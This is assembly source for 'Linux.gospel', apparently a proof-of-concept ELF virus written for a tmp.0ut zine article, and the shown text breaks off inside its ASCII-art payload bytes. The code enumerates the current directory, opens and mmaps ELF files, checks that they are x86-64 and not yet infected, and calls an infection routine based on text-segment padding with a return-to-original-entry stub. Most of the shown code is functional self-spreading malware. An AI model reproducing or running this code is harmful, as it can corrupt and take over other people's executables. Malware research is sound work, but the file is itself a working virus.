BITS 64
;*******************************************************************************
; Linux.gospel
; Written by ic3qu33n
; ********************
;
; gospel is a Linux virus that implements the text segment padding technique 
; created by Silvio Cesare (aka silvio) and documented in his articles 
; “UNIX viruses” [1] and “UNIX ELF Parasites and virus” [2].
; gospel is an ELF infector that adds its viral payload to the region 
; reserved for padding bytes between the .text segment and the .data segment. 
; It relies on the use of padding bytes between segments as a page-aligned 
; region of available memory.
;
; This PoC virus for my tmp.0ut  article 
; “u used 2 call me on my polymorphic shell phone, pt. 1: 
; gospel for a new epoch”
; tmp.0ut volume 3.
;
; **********************
; Primary vx references
; **********************
; The primary vx resources that I referenced while writing this virus 
; are the following 
; (also listed with the same reference numbers in the References section 
; for consistency):
; [2] “UNIX ELF Parasites and virus,” Silvio Cesare, October 1998 
; https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix02.htm 
; [4b]“VIT Virus: VIT source,” Silvio Cesare, October 1998, 
; https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html 
; (navigate to it from this page; I’m not putting the link to the tarball 
; here so you don't accidentally download it. yw.)
; [13] “Skeksi virus,” elfmaster, https://github.com/elfmaster/skeksi_virus 
; [14] "Linux.Nasty.asm," TMZ, 2021, tmp.0ut, volume 1 https://tmpout.sh/1/Linux.Nasty.asm 
; [15] "Linux.Nasty: Assembly x64 ELF virus," TMZ, 2021, https://www.guitmz.com/linux-nasty-elf-virus/ 
; [16] Return To Original Entry Point Despite PIE", s0lden, tmp.0ut, volume 1, https://tmpout.sh/1/11.html 
; [17] S01den and Sblip, tmp.0ut, volume 1, https://tmpout.sh/1/Linux.Kropotkine.asm   
; [18] anansi, sad0p, https://github.com/sad0p/anansi ;
; ************************
; How to assemble gospel:
; ************************
; The Makefile in this repo can be used to assemble gospel.
; Alternatively, to assemble gospel, you will need
; i. nasm
; ii. an x86_64 GNU linker 
;
; Note: I used x86_64-linux-gnu-ld on an aarch64 Kali vm: 
; Debian 6.5.3-1kali1 (2023-09-19) aarch64 GNU/Linux
; This was a good option for me since I needed a cross-compiler 
; toolchain for my dev env, 
; but feel free to use your favorite compatible linker
;
; To assemble, use the following command:
; nasm -f elf64 gospel.asm -o gospel.o && ld gospel.o -o gospel
;
; ************************
; greetz <3
; ************************
; Everyone on the tmp.0ut team for the support/feedback/debugging sessions 
; Richinseattle, elfmaster, TMZ, B3nny, MalcolmVX, and everyone on the vc debugging calls for being rad <3 
; Extra special shoutouts and thank you to netspooky and sblip for all of their support and feedback on this project! 
; Travis Goodspeed 
; Silvio (Silvio if you read this then, hello! I love your work!)
; jduck, botvx, mrphrazer, lauriewired
; 0daysimpson, zeta, dnz, srsns, xcellerator, bane, h0wdy, gren 
; Aaron DeVera
; Everyone in the slop pit/the Haunted Computer Club and all my homies near + far
; ilysm xoxoxoxoxoxxo 
;
; *********************************
; References:
; *********************************
; [1] “Unix Viruses,” Silvio Cesare, 
; https://web.archive.org/web/20020604060624/http://www.big.net.au/~silvio/unix-viruses.txt 
; [2] “UNIX ELF Parasites and virus,” Silvio Cesare, October 1998,
; https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix02.htm 
; [3 — same as 1, different URL] “UNIX Viruses” Silvio Cesare, October 1998
; https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix01.htm 
; [4] “The VIT(Vit.4096) Virus,” Silvio Cesare, October 1998
; https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html 
; [4a]“VIT Virus: VIT description,” Silvio Cesare, October 1998
; https://web.archive.org/web/20020228014729/http://www.big.net.au/~silvio/vit.txt 
; [4b]“VIT Virus: VIT source,” Silvio Cesare, October 1998, 
; https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html 
; (navigate to it from this page; I’m not putting the link to the tarball here 
; so u don't accidentally download it. yw.)
; [5] “Shared Library Call Redirection via ELF PLT Infection”, Silvio Cesare, 
; Phrack, Volume 0xa Issue 0x38, 
; 05.01.2000, 0x07[0x10], http://phrack.org/issues/56/7.html#article 
; [6] “Getdents.old.att”
; Github: sblip,
; [7] "ASM Tutorial for Linux n' ELF file format", BY LiTtLe VxW, 29A issue #8
; [8] “Linux virus writing tutorial” [v1.0 at xx/12/99], by mandragore, 
; from Feathered Serpents, 29A issue #4
; [9] “Half virus: Linux.A.443,” Pavel Pech (aka TheKing1980), 03/02/2002, 
; 29A issue #6
; [10] “Linux Mutation Engine (source code) [LiME] Version: 0.2.0,” 
; written by zhugejin at Taipei, Taiwan; 
; Date: 2000/10/10, Last update: 2001/02/28, 29A issue #6
; [11] “Win32/Linux.Winux”, by Benny/29A, 29A issue #6
; [12] “Metamorphism in practice or How I made MetaPHOR and what I've learnt”, 
; by The Mental Driller/29A, 29A issue #6
; [13] “Skeksi virus,” elfmaster
; https://github.com/elfmaster/skeksi_virus 
; [14] “Linux.Nasty.asm,” TMZ, 2021, tmp.0ut, volume 1
; https://tmpout.sh/1/Linux.Nasty.asm
; [15] “Linux.Nasty.asm,” TMZ, 2021,
; https://www.guitmz.com/linux-nasty-elf-virus/ 
; [16] Return To Original Entry Point Despite PIE", s0lden, tmp.0ut, volume 1, https://tmpout.sh/1/11.html
; [17] S01den and Sblip, tmp.0ut, volume 1, https://tmpout.sh/1/Linux.Kropotkine.asm  
; [18] anansi, sad0p, https://github.com/sad0p/anansi
; 
;*******************************************************************************
; gospel stack layout:
; stacks on stacks on stacks 
; I'm doing this because a .bss section for a virus
; is a nightmare to deal with
; so, yw,  I've written out the stack layout 4 u
; il n'y a plus de cauchemars
; jtm 
; xoxo
;
; Note that I use r14 here rather than rsp
; This is because gospel begins by reserving 0x2000 bytes on 
; the stack and then moving the saved value of [rsp - 0x2000] to r14
; 
;***************************************************************
;
;//////////  filestat struct //////////////
;
; r14 	 =	struc filestat
; r14 + 0		.st_dev			resq		1 ;IDdevcontainingfile
; r14 +	8		.st_ino			resq		1	;inode#
; r14 + 16		.st_mode		resd		1	;mode
; r14 + 20		.st_nlink		resd		1	;#ofhardlinks
; r14 + 24		.st_uid			resd		1	;useridofowner
; r14 + 28		.st_gid			resd		1	;groupIdofowner
; r14 + 32		.st_rdev		resq		1	;devID
; r14 + 40		.st_pad1		resq		1	;padding
; r14 + 48		.st_size		resd		1	;totalsizeinbytes
; r14 + 52		.st_blksize		resq		1	;blocksizeforfsi/o
; r14 + 60		.st_pad2		resd		1	;padding
; r14 + 68		.st_blocks		resq 		1;#of512bblocksalloc'd
; r14 + 76		.st_atime		resq		1 ;timelastfileaccess
; r14 + 84		.st_mtime		resq		1 ;timeoflastfilemod
; r14 + 92		.st_ctime		resq 		1 ;timelastfilechange
; ...
; r14 + 144 end struc
;
;//////////   ***Return to OEP instructions*** //////////////
; Instructions for returning to original entry point of PIE host ELF
; after conclusion of vx routines; appended to end of vx body
; Shout to MalcolmVX for the guidance and help on figuring out the ret2oep routine 
; References:
;[16] Return To Original Entry Point Despite PIE", s0lden, tmp.0ut, volume 1, https://tmpout.sh/1/11.html
;[17] S01den and Sblip, tmp.0ut, volume 1, https://tmpout.sh/1/Linux.Kropotkine.asm  
;[18] anansi, sad0p, https://github.com/sad0p/anansi
;
;[r14 + 150] = 0xe8			;call get_rip
;[r14 + 151] = 0x14			;at offset of 0x14 from curr instruction
;[r14 + 155] = 0x2d48			;sub rax, vlen+5(length of get_rip instructions)
;[r14 + 157] = vlen+5			
;[r14 + 161] = 0x2d48			;sub rax, vxstart
;[r14 + 163] = vxstart			
;[r14 + 167] = 0x0548			;add rax, OEP
;[r14 + 169] = OEP			
;[r14 + 173] = 0xe0ff			;0xff 0xe0 = jump eax
;[r14 + 175] = 0x24048b48		;mov rax, [rsp]; <- call get_rip
;[r14 + 179] = 0xc3				;ret 
;		
;//////////  Local variables //////////////
; 	(used for phdr and shdr manipulation routines 
;
; r14 + 200 = local filename (saved from dirent.d_nameq)
;
;	...
;
; r14 + 400 ; evaddr: dq 0 
; r14 + 408 ; oshoff: dq 0		;original section header offset
; r14 + 416 ; fd:	dq 0
; r14 + 424 ; next_segment_offset: dq 0
; r14 + 432 ; hostentry_offset: dd 0
; r14 + 436 ; vxoffset: dd 0
; r14 + 440 ; vxshoff: dd 0
; r14 + 444 ; vx_padding_size: dd 0
; r14 + 448 ; original_entry_point: dq 0
;
; r14 + 500 = # of dirent entries returned from getdents64 syscall 
;
;
;//////////  dirent struct //////////////
;
; r14 + 600 = 	struc linuxdirent
; r14 + 600			.d_ino:			resq	1
; r14 + 608			.d_off:			resq	1
; r14 + 616			.d_reclen:		resb	2
; r14 + 618			.d_nameq:		resb	1
; r14 + 619			.d_type:		resb	1
; r14 + 620		endstruc
;
;
;////////// ELF Header //////////////
;
; r14 + 800 = mmap'd copy of host ELF executable to infect
; r14 + 800	struc elf_ehdr
; r14 + 800		.e_ident		resd	1		;unsignedchar
; r14 + 804		.ei_class		resb	1		;
; r14 + 805		.ei_data		resb	1		;
; r14 + 806		.ei_version		resb	1		;
; r14 + 807		.ei_osabi		resb	1		;
; r14 + 808		.ei_abiversion	resb	1		;
; r14 + 809		.ei_padding		resb	6		;bytes9-14
; r14 + 815		.ei_nident		resb	1		;sizeofidentarray
; r14 + 816		.e_type			resw	1		;uint16_t,bytes16-17
; r14 + 818		.e_machine		resw	1		;uint16_t,bytes18-19
; r14 + 820		.e_version		resd	1		;uint32_t, bytes 20-23
; r14 + 824		.e_entry		resq	1		;ElfN_Addr, bytes 24-31
; r14 + 832		.e_phoff		resq	1		;ElfN_Off, bytes 32-39
; r14 + 840		.e_shoff		resq	1		;ElfN_Off, bytes 40-47
; r14 + 848		.e_flags		resd	1		;uint32_t, bytes 48-51
; r14 + 852		.e_ehsize		resb	2		;uint16_t, bytes 52-53
; r14 + 854		.e_phentsize	resb	2		;uint16_t, bytes 54-55
; r14 + 856		.e_phnum		resb	2		;uint16_t, bytes 56-57
; r14 + 858		.e_shentsize	resb	2		;uint16_t, bytes 58-59
; r14 + 860		.e_shnum		resb	2		;uint16_t, bytes 60-61
; r14 + 862		.e_shstrndx		resb	2		;uint16_t, bytes 62-63
; r14 + 864	endstruc
;
;
;////////// ELF Program Headers //////////////
;
; the ELF Program headers will exist as entries in the PHdr table
; we ofc won't know ahead of time how many entries there are
; but we do know the offsets to all the fields of each Phdr entry
; so we can use those offsets, combined with the elf_ehdr.e_phoff
;
; the calculation to each phdr will essentially be:
; phdr_offset = elf_ehdr.e_phoff + (elf_ehdr.e_phentsize * phent_index)
; where phent_index is an integer n in the range [0, elf_ehdr.e_phnum]
; corresponding to the nth Phdr entry
; I've simplified this in the below offset listings --
; the below offset listings assume that you are at the 0th PHdr
; obv adjust accordingly 

;  r14 + 800 + elf_ehdr.e_phoff + 0	struc elf_phdr
;  r14 + 800 + elf_ehdr.e_phoff + 0	.p_type			resd 1		; uint32_t   
;  r14 + 800 + elf_ehdr.e_phoff + 4	.p_flags		resd 1		; uint32_t   
;  r14 + 800 + elf_ehdr.e_phoff + 8	.p_offset		resq 1		; Elf64_Off  
;  r14 + 800 + elf_ehdr.e_phoff + 16	.p_vaddr		resq 1		; Elf64_Addr 
;  r14 + 800 + elf_ehdr.e_phoff + 24	.p_paddr		resq 1		; Elf64_Addr 
;  r14 + 800 + elf_ehdr.e_phoff + 32	.p_filesz		resq 1		; uint64_t   
;  r14 + 800 + elf_ehdr.e_phoff + 40	.p_memsz		resq 1		; uint64_t   
;  r14 + 800 + elf_ehdr.e_phoff + 48	.p_align		resq 1		; uint64_t   
;  r14 + 800 + elf_ehdr.e_phoff + 56	endstruc
;
;
;////////// ELF Section Headers //////////////
;
; We can use the same breakdown of offsets for the ELF Section Headers:
;
;  r14 + 800 + elf_ehdr.e_shoff + 0	struc elf_shdr
;  r14 + 800 + elf_ehdr.e_shoff + 0	.sh_name		resd 1		; uint32_t   
;  r14 + 800 + elf_ehdr.e_shoff + 4	.sh_type		resd 1		; uint32_t   
;  r14 + 800 + elf_ehdr.e_shoff + 8	.sh_flags		resq 1		; uint64_t   
;  r14 + 800 + elf_ehdr.e_shoff + 16	.sh_addr		resq 1		; Elf64_Addr 
;  r14 + 800 + elf_ehdr.e_shoff + 24	.sh_offset		resq 1		; Elf64_Off  
;  r14 + 800 + elf_ehdr.e_shoff + 32	.sh_size		resq 1		; uint64_t   
;  r14 + 800 + elf_ehdr.e_shoff + 40    .sh_link		resd 1		; uint32_t   
;  r14 + 800 + elf_ehdr.e_shoff + 44	.sh_info		resd 1		; uint32_t   
;  r14 + 800 + elf_ehdr.e_shoff + 48	.sh_addralign	resq 1		; uint64_t   
;  r14 + 800 + elf_ehdr.e_shoff + 56	.sh_entsize		resq 1		; uint64_t   
;  r14 + 800 + elf_ehdr.e_shoff + 64	endstruc
;*******************************************************************************
section .text
global _start
default rel
_start:
	jmp vxstart
	vxsig: db "xoxo",0
vxstart:
	push rsp ;preserve rsp first since push will alter the value.
	push rbp
	push rax
	push rbx
	push rcx
	push rdx
	push rsi
	push rdi
	push r8
	push r9
	push r10
	push r11
	push r12
	push r13
	push r14
	push r15
	mov rbp, rsp
	sub rsp, 0x2000
	mov r14, rsp
	jmp get_cwd
;*******************************************************************************
; open - syscall 0x2
;;	open(filename, flags, mode);
;;	rdi == filename
;;	rsi == flags
;;	rdx == mode
;; 	returns: fd (in rax, obv)
;*******************************************************************************
_getdirents:
	pop rdi
	xor rsi, rsi 		;no flags
	add rsi, 0x02000000
	mov rdx, 0x0		;open read-only
	mov rax, 0x2		;SYS_OPEN ==0x2
	syscall
	mov r9, rax						;r14 + 416 into r9
	jmp process_dirents
get_cwd:
	call _getdirents
	targetdir: db ".",0
;*******************************************************************************
; getdents64 - syscall 0x4e
;;getdents(unsigned int fd, struct linuxdirent *dirent, unsigned int count);
;;	rdi == fd
;;	rsi == *dirent
;;	rdx == count
;;	returns # entries in rax
;
; [r14 + 600 + dirent] holds the pointer to the first dirent struct
; so we can iterate through all dirent entries using the size field in 
; this dirent struc as an offset for successive jumps in address space	
;*******************************************************************************
process_dirents:
	mov rdi, rax
	lea rsi, [r14 + 600] ;r14 + 600 = location on stack for saved dirent struct
	mov rdx, 0x800		; MAX_RDENT_BUF_SIZE
	mov rax, 0x4e		;SYS_GETDENTS64
	syscall

	mov r8, rax 				;save # of dirent entries in r8
	mov qword [r14 + 500], rax	;also save # of dir entries to var on stack
;*******************************************************************************
; close - syscall 0x3
;;	close(fd);
;;	rdi == fd ;r14 + 416 (file descriptor)
;; 	returns: 0 on success (-1 on error)
;*******************************************************************************
	mov rdi, r9
	mov rax, 0x3 ;SYS_CLOSE
	syscall
	
	xor rcx, rcx	
	jmp check_file

;*******************************************************************************
;check_file:
;	open file -> fstat file (get file size) - > use fstat.size for mmap call & mmap file	
;	upon successful mmap, close file
;	use mmaped file for checks to confirm that the target file satisfies the following:
;	1. the target file is an executable
;	2. the target file is an ELF
;	3. the target file is a 64-bit ELF
;	4. (optional, but requirement for rn): the target file is for x86_64 arch
;	5. the target file is not already infected (check w signature at known offset)
;	*If all of the following above conditions hold, then call the infection routine
;	Otherwise, continue looping through the remaining files in the directory
;
; a comparison using the dirent d_type is not reliable since d_type is an optional field
; since d_type field in the dirent struct might not be available, 
; use the macros for fstat instead for checking the validity of a candidate file 
; associated with each dirent entry
;*******************************************************************************
check_file:
	push rcx
	check_elf:
		push rcx					;preserve rcx before syscall
		lea rdi, [rcx + r14 + 618]	;linuxdirent entry filename (linuxdirent.d_nameq) in rdi
		mov rsi, 0x2 						;flags - read/write (OPEN_RDWR) in rsi
		xor rdx, rdx						;mode - 0
		mov rax, 0x2						;SYS_OPEN ==0x2
		syscall
		pop rcx						;restore rcx for dirent offset

		cmp rax, 0
		jb checknext
		mov r9, rax
		push r9
		mov r8, rax
		mov [r14 + 144], rax
		xor r12, r12
	.copy_filename:
		lea rdi, [r14 + 200] 
		lea rsi, [rcx + r14 + 618]
		mov qword [rdi], rsi
		xor rax, rax
		xor r12, r12
		jmp get_vx_name
	check_vx_name:
		pop rsi
		lea rdi, [r14 + 200]
		cld
		.filenameloop:
			mov byte al, [rsi]
			cmp byte [rdi], al
			jne get_filestat
			inc r12
			inc rdi
			inc rsi
			cmp r12, 5
			jnz .filenameloop
		jmp checknext
	get_vx_name:
		call check_vx_name
		vxname: db "gospel",0		
	get_filestat:
		lea rsi, [r14]				;size for mmap == e_shoff + (e_shnum * e_shentsize)
		mov rdi, r8 				;retrieve size from filestat struct with an fstat syscall
		mov rax, 0x5 ;SYS_FSTAT
		syscall
;*******************************************************************************
		;void *mmap(void addr[.length], size_t length, int prot, int flags,
		;                  int r14 + 416, off_t offset);
;*******************************************************************************
	mmap_file:
		xor rdi, rdi			;set RDI to NULL
		mov rsi, [r14 + 48] 	;filestat.st_size
		mov rdx, 0x3 			; (PROT_READ | PROT_WRITE)
								; fd is already in r8 
		mov r10, 0x2			; MAP_PRIVATE
		xor r9, r9				; offset of 0 within file	
		mov rax, 0x9 			;SYS_MMAP
		syscall
		cmp rax, 0
		jb checknext
		pop r9
		mov r8, rax
		mov [r14 + 800], rax	;rax contains addr of mmap'd host ELF
		push rax
	close_curr_file:
		mov rdi, r9
		mov rax, 0x3 			;SYS_CLOSE
		syscall
		pop rax
		test rax, rax
		js checknext
;*******************************************************************************
;ELF header vals
;ETYPE_DYN			equ 0x3
;ETYPE_EXEC			equ 0x2
;*******************************************************************************
	check_elf_header_etype:
		cmp word [rax + 16], 0x0002		;elf_ehdr.e_type
		je check_elf_header_magic_bytes
		cmp word [rax + 16], 0x0003		;elf_ehdr.e_type
		je check_elf_header_magic_bytes
		jnz checknext
	check_elf_header_magic_bytes:
		cmp dword [rax], 0x464c457f		;elf_ehdr.e_ident
		jnz checknext
;*******************************************************************************
;ELF header vals
;ELFCLASS64 		equ 0x2
;*******************************************************************************
	check_elf_header_64bit:
		cmp byte [rax + 4], 0x2
		jne checknext
;*******************************************************************************
;ELF header vals
;ELFX8664			equ 0x3e
;*******************************************************************************
	check_elf_header_arch:
		cmp byte [rax + 18], 0x3e			;elf_ehdr.e_machine
		jne checknext
	verifie_pas_de_vx_sig:
		lea r13, [rax + 24]					;elf_ehdr.e_entry
		cmp dword [r13 + 2], 0x786f786f
		je checknext
	verifie_deja_infecte:
		cmp dword [rax + 9], 0x786f786f		;elf_ehdr.ei_padding
		je checknext
	ready2infect:
		call infect	
		jmp painting
	checknext:
		lea rdi, [r14 + 416]
		mov rsi, [r14 + 48] 			;filestat.st_size
		mov rax, 0xB ;SYS_MUNMAP
		syscall

		pop rcx
		add cx, [rcx + r14 + 616] 		; linuxdirent.d_reclen
		cmp qword rcx, [r14 + 500]
		jl check_file
	painting:
	call payload
		db 0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x21,0x21,0x21,0x27,0x27,0x27,0x27,0x21,0x21,0x21,0x21,0x21,0x21,0x6f,0x6f,0x6f,0x6f,0x6f,0x6f,0x6f,0x6f
		db 0xa,0x21,0x21,0x21,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x27,0x3c,0x3c,0x3c,0x3c,0x3c,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x21,0x21,0x21,0x21,0x21,0x21,0x6f,0x6f,0x6f
		db 0x6f,0xa,0x27,0x27,0x27,0x27,0x27,0x27,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x27,0x27,0x27,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x21,0x21
		db 0x21,0x21,0xa,0x27,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3c,0x3c,0x27,0x27,0x21,0x27,0x27,0x3c,0x3e,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x27,0x27,0x27,0x27
		db 0x27,0x27,0x21,0xa,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3c,0x27,0x21,0x21,0x27,0x3c,0x3c,0x3e,0x3e,0x3e,0x3e,0x3c,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3c,0x3c,0x3c,0x3c,0x3c,0x3c
		db 0x3c,0x27,0x27,0x27,0xa,0x3c,0x3e,0x3c,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3c,0x27,0x27,0x27,0x3c,0x3c,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3c,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3c,0x3c,0x3c,0x3e,0x3e,0x3c,0x3c
		db 0x3c,0x3c,0x3c,0x3c,0x27,0xa,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x25,0x3e,0x3e,0x3e,0x3c,0x27,0x3c,0x3e,0x3e,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x25,0x25,0x25,0x3e,0x3e,0x3e,0x3c,0x3c,0x3e,0x3e,0x3e,0x3e,0x3e
		db 0x3e,0x3e,0x3c,0x3c,0x3c,0x3c,0xa,0x3e,0x3e,0x3e,0x3e,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x25,0x27,0x21,0x3e,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3c,0x3c,0x3e,0x25,0x25,0x25,0x3e,0x3e
		db 0x3e,0x3e,0x3e,0x3e,0x3e,0x3c,0x3c,0xa,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3c,0x78,0x27,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3e,0x25,0x25,0x3c,0x3e,0x25,0x25,0x25,0x25,0x25
		db 0x25,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3c,0xa,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x25,0x21,0x6f,0x3c,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3e,0x3c,0x3c,0x3e,0x25,0x3e,0x3e,0x3e,0x25,0x25,0x25,0x25,0x25
		db 0x25,0x25,0x25,0x25,0x3e,0x3e,0x3e,0x3e,0x3e,0xa,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x25,0x6f,0x21,0x3e,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x27,0x3c,0x3e,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25
		db 0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3e,0xa,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3c,0x25,0x3c,0x21,0x3c,0x3e,0x3e,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3c,0x27,0x3c,0x3e,0x25,0x3e,0x25,0x25,0x25,0x25,0x25,0x25
		db 0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0xa,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x25,0x3e,0x27,0x27,0x3c,0x3e,0x3e,0x3c,0x3e,0x3e,0x25,0x3e,0x3c,0x25,0x25,0x25,0x3e,0x3e,0x3e,0x3e,0x3e,0x25,0x25,0x25,0x25,0x25
		db 0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0xa,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3c,0x78,0x44,0x44,0x78,0x27,0x25,0x25,0x25,0x25,0x25,0x25,0x3c,0x3c,0x3e,0x3e,0x3e,0x3e,0x25,0x3e,0x3e,0x3e,0x3e,0x25,0x25
		db 0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0xa,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x27,0x78,0x78,0x27,0x27,0x25,0x3e,0x3e,0x25,0x25,0x25,0x25,0x3e,0x27,0x21,0x27,0x3e,0x3c,0x27,0x3e,0x25,0x25,0x3e,0x25
		db 0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3e,0xa,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3c,0x27,0x27,0x3c,0x3e,0x25,0x3c,0x3c,0x3e,0x3c,0x3c,0x27,0x3c,0x3c,0x21,0x3c,0x25,0x25,0x27,0x3c,0x25,0x25,0x27
		db 0x3c,0x3e,0x3e,0x3e,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3e,0xa,0x25,0x25,0x25,0x2a,0x25,0x3e,0x3e,0x25,0x3c,0x3e,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x25,0x25,0x3e,0x21,0x27,0x3e,0x3c,0x3c,0x3e,0x25,0x3e,0x27,0x27,0x27
		db 0x3c,0x3e,0x3e,0x25,0x25,0x3e,0x3e,0x3e,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0xa,0x25,0x25,0x25,0x2a,0x2a,0x25,0x3c,0x25,0x25,0x25,0x25,0x3e,0x3e,0x21,0x3c,0x25,0x2a,0x25,0x25,0x25,0x25,0x3c,0x27,0x27,0x3c,0x21,0x21,0x3c,0x27,0x3c,0x3e
		db 0x3c,0x27,0x21,0x27,0x3c,0x25,0x25,0x25,0x3e,0x3c,0x3c,0x25,0x25,0x25,0x25,0x25,0x3e,0xa,0x25,0x25,0x25,0x2a,0x2a,0x25,0x3c,0x25,0x25,0x25,0x25,0x25,0x3e,0x6f,0x6f,0x6f,0x3c,0x3e,0x3e,0x25,0x25,0x25,0x3e,0x3e,0x25,0x3e,0x3e,0x3e,0x27,0x6f
		db 0x21,0x27,0x3c,0x3c,0x3e,0x3e,0x3e,0x25,0x25,0x25,0x3e,0x3c,0x3c,0x3e,0x3e,0x3e,0x25,0x3e,0xa,0x25,0x25,0x2a,0x2a,0x2a,0x25,0x3e,0x3e,0x3c,0x25,0x25,0x2a,0x25,0x27,0x21,0x44,0x44,0x78,0x6f,0x21,0x21,0x21,0x21,0x3e,0x3e,0x3c,0x3e,0x25,0x3e
		db 0x3c,0x3c,0x3c,0x25,0x2a,0x2a,0x25,0x3e,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0xa,0x25,0x25,0x25,0x2a,0x2a,0x2a,0x2a,0x25,0x3e,0x3e,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x25,0x25,0x2a
		db 0x2a,0x2a,0x25,0x3e,0x25,0x25,0x25,0x2a,0x25,0x3c,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0xa,0x25,0x25,0x25,0x25,0x2a,0x25,0x25,0x3e,0x27,0x21,0x27,0x27,0x21,0x27,0x27,0x3e,0x3e,0x3e,0x3e,0x3e,0x25,0x3e,0x3e,0x3c,0x25,0x2a,0x25
		db 0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3c,0x3e,0x25,0x3e,0x3c,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0xa,0x25,0x25,0x25,0x25,0x25,0x25,0x27,0x21,0x21,0x21,0x21,0x21,0x3c,0x3e,0x3c,0x3e,0x25,0x25,0x3e,0x25,0x25,0x3e,0x25,0x25,0x25,0x25
		db 0x25,0x3e,0x25,0x25,0x2a,0x25,0x3e,0x25,0x3e,0x25,0x25,0x3e,0x3e,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3e,0xa,0x25,0x25,0x25,0x25,0x25,0x3e,0x27,0x27,0x27,0x27,0x27,0x3c,0x3c,0x27,0x27,0x21,0x21,0x3c,0x3e,0x3e,0x27,0x3c,0x25,0x3e,0x3e
		db 0x25,0x25,0x3c,0x3e,0x2a,0x2a,0x25,0x25,0x2a,0x25,0x3e,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3e,0x3e,0x3e,0xa,0x25,0x25,0x25,0x25,0x3e,0x3c,0x27,0x27,0x3c,0x25,0x3c,0x3e,0x25,0x21,0x3e,0x3e,0x6f,0x3e,0x3e,0x3e,0x21,0x21,0x3e,0x3c
		db 0x27,0x3e,0x3e,0x3e,0x25,0x25,0x25,0x25,0x2a,0x2a,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3e,0xa,0x25,0x25,0x25,0x25,0x21,0x21,0x27,0x27,0x21,0x27,0x6f,0x6f,0x21,0x78,0x6f,0x6f,0x78,0x78,0x6f,0x21,0x6f,0x27,0x3e
